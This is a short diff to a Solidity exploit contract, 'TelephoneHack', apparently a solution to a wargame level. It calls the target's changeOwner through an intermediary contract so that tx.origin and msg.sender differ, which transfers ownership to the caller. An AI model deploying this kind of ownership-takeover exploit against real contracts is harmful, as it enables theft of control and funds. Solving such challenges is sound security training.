@@ -7,15 +7,13 @@ interface ITelephone {
 }
 
 contract TelephoneHack {
-    ITelephone public challenge;
+    ITelephone telephone;
 
-    constructor(address challengeAddress) {
-        challenge = ITelephone(challengeAddress);
+    constructor(address _telephoneContract) {
+        telephone = ITelephone(_telephoneContract);
     }
 
-    function attack() external payable {
-        challenge.changeOwner(tx.origin);
+    function attack() external {
+        telephone.changeOwner(msg.sender);
     }
-
-    fallback() external payable {}
 }
